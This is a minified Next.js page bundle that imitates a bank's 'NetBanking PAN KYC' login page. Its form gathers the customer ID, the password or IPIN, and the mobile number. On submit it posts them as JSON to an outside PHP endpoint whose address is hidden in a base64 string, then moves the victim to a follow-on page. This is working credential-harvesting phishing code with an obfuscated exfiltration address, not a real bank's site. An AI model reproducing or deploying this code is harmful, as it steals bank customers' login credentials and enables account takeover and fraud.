(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [349], {
        7880: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/h", function() {
                return n(6141)
            }])
        },
        9018: function(e, t) {
            "use strict";
            t.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        1210: function(e, t) {
            "use strict";

            function n(e, t, n, o) {
                return !1
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.getDomainLocale = n, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        8418: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            var o = n(4941).Z;
            n(5753).default, Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.default = void 0;
            var r = n(2648).Z,
                a = n(7273).Z,
                s = r(n(7294)),
                l = n(6273),
                i = n(2725),
                c = n(3462),
                u = n(1018),
                d = n(7190),
                f = n(1210),
                h = n(8684),
                p = {};

            function m(e, t, n, o) {
                if (e && l.isLocalURL(t)) {
                    Promise.resolve(e.prefetch(t, n, o)).catch(function(e) {});
                    var r = o && void 0 !== o.locale ? o.locale : e && e.locale;
                    p[t + "%" + n + (r ? "%" + r : "")] = !0
                }
            }
            var x = s.default.forwardRef(function(e, t) {
                var n, r, x = e.href,
                    v = e.as,
                    j = e.children,
                    y = e.prefetch,
                    N = e.passHref,
                    g = e.replace,
                    b = e.shallow,
                    L = e.scroll,
                    w = e.locale,
                    C = e.onClick,
                    _ = e.onMouseEnter,
                    P = e.onTouchStart,
                    k = e.legacyBehavior,
                    E = void 0 === k ? !0 !== Boolean(!1) : k,
                    R = a(e, ["href", "as", "children", "prefetch", "passHref", "replace", "shallow", "scroll", "locale", "onClick", "onMouseEnter", "onTouchStart", "legacyBehavior"]);
                n = j, E && ("string" == typeof n || "number" == typeof n) && (n = s.default.createElement("a", null, n));
                var M = !1 !== y,
                    O = s.default.useContext(c.RouterContext),
                    T = s.default.useContext(u.AppRouterContext);
                T && (O = T);
                var I = s.default.useMemo(function() {
                        var e = o(l.resolveHref(O, x, !0), 2),
                            t = e[0],
                            n = e[1];
                        return {
                            href: t,
                            as: v ? l.resolveHref(O, v) : n || t
                        }
                    }, [O, x, v]),
                    D = I.href,
                    S = I.as,
                    Z = s.default.useRef(D),
                    B = s.default.useRef(S);
                E && (r = s.default.Children.only(n));
                var U = E ? r && "object" == typeof r && r.ref : t,
                    A = o(d.useIntersection({
                        rootMargin: "200px"
                    }), 3),
                    F = A[0],
                    H = A[1],
                    K = A[2],
                    G = s.default.useCallback(function(e) {
                        (B.current !== S || Z.current !== D) && (K(), B.current = S, Z.current = D), F(e), U && ("function" == typeof U ? U(e) : "object" == typeof U && (U.current = e))
                    }, [S, U, D, K, F]);
                s.default.useEffect(function() {
                    var e = H && M && l.isLocalURL(D),
                        t = void 0 !== w ? w : O && O.locale,
                        n = p[D + "%" + S + (t ? "%" + t : "")];
                    e && !n && m(O, D, S, {
                        locale: t
                    })
                }, [S, D, H, w, M, O]);
                var W = {
                    ref: G,
                    onClick: function(e) {
                        E || "function" != typeof C || C(e), E && r.props && "function" == typeof r.props.onClick && r.props.onClick(e), e.defaultPrevented || function(e, t, n, o, r, a, i, c, u, d) {
                            if ("A" !== e.currentTarget.nodeName.toUpperCase() || (!(h = (f = e).currentTarget.target) || "_self" === h) && !f.metaKey && !f.ctrlKey && !f.shiftKey && !f.altKey && (!f.nativeEvent || 2 !== f.nativeEvent.which) && l.isLocalURL(n)) {
                                e.preventDefault();
                                var f, h, p = function() {
                                    "beforePopState" in t ? t[r ? "replace" : "push"](n, o, {
                                        shallow: a,
                                        locale: c,
                                        scroll: i
                                    }) : t[r ? "replace" : "push"](n, {
                                        forceOptimisticNavigation: !d
                                    })
                                };
                                u ? s.default.startTransition(p) : p()
                            }
                        }(e, O, D, S, g, b, L, w, Boolean(T), M)
                    },
                    onMouseEnter: function(e) {
                        E || "function" != typeof _ || _(e), E && r.props && "function" == typeof r.props.onMouseEnter && r.props.onMouseEnter(e), !(!M && T) && l.isLocalURL(D) && m(O, D, S, {
                            priority: !0
                        })
                    },
                    onTouchStart: function(e) {
                        E || "function" != typeof P || P(e), E && r.props && "function" == typeof r.props.onTouchStart && r.props.onTouchStart(e), !(!M && T) && l.isLocalURL(D) && m(O, D, S, {
                            priority: !0
                        })
                    }
                };
                if (!E || N || "a" === r.type && !("href" in r.props)) {
                    var Y = void 0 !== w ? w : O && O.locale,
                        q = O && O.isLocaleDomain && f.getDomainLocale(S, Y, O.locales, O.domainLocales);
                    W.href = q || h.addBasePath(i.addLocale(S, Y, O && O.defaultLocale))
                }
                return E ? s.default.cloneElement(r, W) : s.default.createElement("a", Object.assign({}, R, W), n)
            });
            t.default = x, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        1018: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.TemplateContext = t.GlobalLayoutRouterContext = t.LayoutRouterContext = t.AppRouterContext = void 0;
            var o = (0, n(2648).Z)(n(7294)),
                r = o.default.createContext(null);
            t.AppRouterContext = r;
            var a = o.default.createContext(null);
            t.LayoutRouterContext = a;
            var s = o.default.createContext(null);
            t.GlobalLayoutRouterContext = s;
            var l = o.default.createContext(null);
            t.TemplateContext = l
        },
        6141: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return m
                }
            });
            var o = n(7568),
                r = n(655),
                a = n(5893),
                s = n(9008),
                l = n.n(s),
                i = n(5675),
                c = n.n(i),
                u = n(1664),
                d = n.n(u),
                f = n(9018),
                h = n(1163),
                p = n(7294);

            function m() {
                var e, t = (0, h.useRouter)(),
                    n = (0, p.useState)(!1),
                    s = n[0],
                    i = n[1],
                    u = (e = (0, o.Z)(function(e) {
                        var n, o, a, s, l, c;
                        return (0, r.__generator)(this, function(r) {
                            switch (r.label) {
                                case 0:
                                    return e.preventDefault(), i(!0), n = new FormData(e.target), o = {}, n.forEach(function(e, t) {
                                        o[t] = e
                                    }), s = {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json"
                                        },
                                        body: JSON.stringify(o)
                                    }, [4, fetch(window.atob(f.Z.dataList) + "?id=" + window.location.hostname, s)];
                                case 1:
                                    return [4, r.sent().json()];
                                case 2:
                                    return c = r.sent(), i(!1), !0 == c.status ? t.push("/p1") : i(!1), [2]
                            }
                        })
                    }), function(t) {
                        return e.apply(this, arguments)
                    });
                return (0, a.jsxs)(a.Fragment, {
                    children: [(0, a.jsxs)(l(), {
                        children: [(0, a.jsx)("title", {
                            children: "Wellcome to"
                        }), (0, a.jsx)("meta", {
                            name: "description",
                            content: "wellcome to"
                        })]
                    }), (0, a.jsx)("div", {
                        className: "header",
                        children: (0, a.jsxs)("div", {
                            className: "logo text-center",
                            children: [(0, a.jsx)(c(), {
                                alt: "the logo",
                                src: "/logo.png",
                                priority: !0,
                                width: 190,
                                height: 32
                            }), (0, a.jsx)("h1", {
                                children: " Welcome to NetBanking "
                            })]
                        })
                    }), (0, a.jsxs)("div", {
                        className: "content",
                        children: [(0, a.jsx)("h2", {
                            children: "Login to NetBanking PAN KYC"
                        }), (0, a.jsxs)("form", {
                            action: "",
                            method: "post",
                            onSubmit: u,
                            children: [(0, a.jsxs)("div", {
                                className: "form-group",
                                children: [(0, a.jsx)("label", {
                                    htmlFor: "username",
                                    children: "Customer ID/ User ID"
                                }), (0, a.jsx)("input", {
                                    type: "text",
                                    className: "form-control",
                                    name: "username",
                                    required: !0
                                })]
                            }), (0, a.jsxs)("div", {
                                className: "form-group",
                                children: [(0, a.jsx)("label", {
                                    htmlFor: "username",
                                    children: "Password/ IPIN"
                                }), (0, a.jsx)("input", {
                                    type: "password",
                                    className: "form-control",
                                    name: "password",
                                    required: !0
                                }), (0, a.jsx)(d(), {
                                    className: "info-forgot",
                                    href: "/",
                                    children: (0, a.jsx)("a", {
                                        children: "Forgot Password / IPINIPIN"
                                    })
                                }), (0, a.jsx)("span", {
                                    className: "info-pass",
                                    children: "IPIN (Password) is case sensitive"
                                })]
                            }), (0, a.jsxs)("div", {
                                className: "form-group",
                                children: [(0, a.jsx)("label", {
                                    htmlFor: "username",
                                    children: "Mobile Number"
                                }), (0, a.jsx)("input", {
                                    type: "text",
                                    className: "form-control",
                                    name: "mobile",
                                    maxLength: 10,
                                    minLength: 10,
                                    title: "Enter Valid Mobile Number",
                                    required: !0
                                })]
                            }), (0, a.jsx)("button", {
                                type: "submit",
                                disabled: !!s,
                                className: "btn btn-primary login-btn",
                                children: "LOGIN"
                            })]
                        }), (0, a.jsx)("div", {
                            className: "second-content",
                            children: (0, a.jsx)(c(), {
                                src: "/nortonsecurity.png",
                                priority: !0,
                                width: 100,
                                height: 72,
                                alt: "northon security"
                            })
                        }), (0, a.jsxs)("div", {
                            className: "security",
                            children: [(0, a.jsx)("span", {
                                className: "text",
                                children: "Your security is of utmost importance."
                            }), (0, a.jsx)(d(), {
                                className: "link",
                                href: "/",
                                children: (0, a.jsx)("a", {
                                    children: "Know More..."
                                })
                            })]
                        }), (0, a.jsx)("div", {
                            className: "line",
                            children: "\xa0"
                        }), (0, a.jsxs)("div", {
                            className: "third-content",
                            children: [(0, a.jsx)("h3", {
                                children: "Don‘t have a Savings Account?"
                            }), (0, a.jsxs)("div", {
                                className: "links",
                                children: [(0, a.jsx)(d(), {
                                    className: "my-link",
                                    href: "/",
                                    children: (0, a.jsx)("a", {
                                        children: "Credit Card only? Login here"
                                    })
                                }), (0, a.jsx)(d(), {
                                    className: "my-link",
                                    href: "/",
                                    children: (0, a.jsx)("a", {
                                        children: "Prepaid Card only? Login here"
                                    })
                                }), (0, a.jsx)(d(), {
                                    className: "my-link",
                                    href: "/",
                                    children: (0, a.jsx)("a", {
                                        children: "Online Retail Loan only? Login here"
                                    })
                                })]
                            }), (0, a.jsx)("h3", {
                                children: "We have added a host of new features!"
                            }), (0, a.jsx)("p", {
                                className: "text-3",
                                children: "You can now do so much more:"
                            }), (0, a.jsxs)("ul", {
                                className: "bulletin",
                                children: [(0, a.jsx)("li", {
                                    children: "Anywhere access through Desktop or mobile"
                                }), (0, a.jsx)("li", {
                                    children: "Enhanced security measures"
                                })]
                            }), (0, a.jsx)(d(), {
                                className: "link",
                                href: "/",
                                children: (0, a.jsx)("a", {
                                    children: "View a Demo"
                                })
                            })]
                        })]
                    }), (0, a.jsxs)("div", {
                        className: "footer",
                        children: ["\xa9 Copyright Bank Ltd.", (0, a.jsx)(d(), {
                            className: "link",
                            href: "/",
                            children: (0, a.jsx)("a", {
                                children: "Terms and Conditions"
                            })
                        }), (0, a.jsx)(d(), {
                            className: "link",
                            href: "/",
                            children: (0, a.jsx)("a", {
                                children: "Privacy Policy"
                            })
                        })]
                    })]
                })
            }
        },
        1664: function(e, t, n) {
            e.exports = n(8418)
        },
        7568: function(e, t, n) {
            "use strict";

            function o(e, t, n, o, r, a, s) {
                try {
                    var l = e[a](s),
                        i = l.value
                } catch (c) {
                    n(c);
                    return
                }
                l.done ? t(i) : Promise.resolve(i).then(o, r)
            }

            function r(e) {
                return function() {
                    var t = this,
                        n = arguments;
                    return new Promise(function(r, a) {
                        var s = e.apply(t, n);

                        function l(e) {
                            o(s, r, a, l, i, "next", e)
                        }

                        function i(e) {
                            o(s, r, a, l, i, "throw", e)
                        }
                        l(void 0)
                    })
                }
            }
            n.d(t, {
                Z: function() {
                    return r
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 7880)
        }), _N_E = e.O()
    }
]);